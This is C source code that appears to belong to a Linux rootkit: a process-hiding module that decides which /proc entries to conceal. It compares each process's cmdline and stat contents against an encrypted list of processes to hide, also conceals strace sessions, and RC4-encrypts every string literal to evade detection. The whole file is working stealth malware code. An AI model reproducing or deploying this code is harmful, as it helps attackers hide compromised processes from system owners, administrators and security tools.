#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "hide.h"
#include "key.h"
#include "rc4.h"
#include "utils.h"

// "/proc"
#define PROC_ENC "\x78\xA6\x88\x5A\xF6"

bool must_hide(const char *path) {
  char what[16];
  char proc_path[6];
  const char *proc_what;
  int i;

  // "/proc"
  strcpy(proc_path, PROC_ENC);
  if (strstr(path, rc4(key, proc_path, 5)) != path)
    return 0;

  // /proc/what?
  //       ^
  //       |_ &path[6]
  proc_what = &path[6];
  for (i = 0; proc_what[i] != '\0' && proc_what[i] != '/'; i++)
    what[i] = proc_what[i];
  what[i] = '\0';
  return hidden_proc(what) == 0;
}

#define DIGITS_SET_ENC "\x67\xE7\xC8\x06\xA1\x19\xD1\x81\xFD\x76"
#define PROC_S_CMDLINE_ENC "\x78\xA6\x88\x5A\xF6\x03\xC2\xC5\xEA" \
                           "\x2C\x4B\xF7\x7F\x3C\x06\x0A"
#define RH_STRACE_ENC "\x24\xBE\xA6\x4D\xA5\x1C\xCA\xD5\x99\x37" \
                      "\x16\xA3\x60\x21\x1A\x0E\xD5\x50"
#define STRACE0_S_ENC "\x24\xA2\x88\x54\xF6\x49\xBB\xCE\xF5\x7F\x0B\xE0"
#define PROC_S_STAT_ENC "\x78\xA6\x88\x5A\xF6\x03\xC2\xC5\xEA\x3C\x52" \
                        "\xF2\x67\x20\x1B"

bool hidden_proc(const char *proc_what) {
  char dst[64];
  char file[256];
  char digits_set[11];
  char proc_s_cmdline[17];
  char rh_strace[19];
  char strace0_s[13];
  char proc_s_stat[16];
  char open_mode[2];
  int fd;
  FILE *f;

  // "0123456789", lol
  strcpy(digits_set, DIGITS_SET_ENC);
  // if proc_what only contains digits, return 1
  if (strspn(proc_what, rc4(key, digits_set, 10)) != strlen (proc_what))
    return 1;
  // "/proc/%s/cmdline"
  strcpy(proc_s_cmdline, PROC_S_CMDLINE_ENC);
  snprintf(file, 256, rc4(key, proc_s_cmdline, 16), proc_what);
  fd = open(file, 0);
  if (fd != -1) {
    ssize_t read_count = read(fd, file, 256);
    if (read_count > 12) {
      // "rh\x00-c\x00strace"
      strcpy(rh_strace, RH_STRACE_ENC);
      if (memcmp(rc4(key, rh_strace, 18), file, 12) == 0)
        return 0;
      // "strace\x00-s"
      strcpy(strace0_s, STRACE0_S_ENC);
      if (memcmp(rc4(key, strace0_s, 12), file, 9) == 0)
        return 0;
    }
    lseek(fd, 0, SEEK_SET);
    // processes to hide
    for (int i = 0; i < 3; i++) {
      memcpy(dst, pth[i].str, pth[i].len);
      dst[pth[i].len] = '\0';
      rc4(key, dst, pth[i].len);
      if (strstrmem(file, read_count, dst))
        return 0;
    }
    close (fd);
  }
  // "/proc/%s/stat"
  strcpy(proc_s_stat, PROC_S_STAT_ENC);
  snprintf(file, 256, rc4(key, proc_s_stat, 15), proc_what);
  // "r"
  strcpy(open_mode, "\x25");
  f = fopen(file, rc4(key, open_mode, 1));
  if (f) {
    char *lineptr = NULL;
    size_t n = 0;
    size_t read_count = getline(&lineptr, &n, f);

    if (read_count > 7) {
      // remove newline
      if (lineptr[read_count - 1] == '\n')
        lineptr[read_count - 1] = '\0';
      // processes to hide
      for (int i = 0; i < 3; i++) {
        memcpy(dst, pth[i].str, pth[i].len);
        dst[pth[i].len] = '\0';
        rc4(key, dst, pth[i].len);
        //   0123456
        //         |
        //   /proc/what_____.
        //                  |
        if (strcmp(&lineptr[6], dst) == 0) {
          free(lineptr);
          fclose(f);
          return 0;
        }
      }
      free(lineptr);
      fclose(f);
      return 1;
    }
    free(lineptr);
    fclose(f);
  }

  return 1;
}
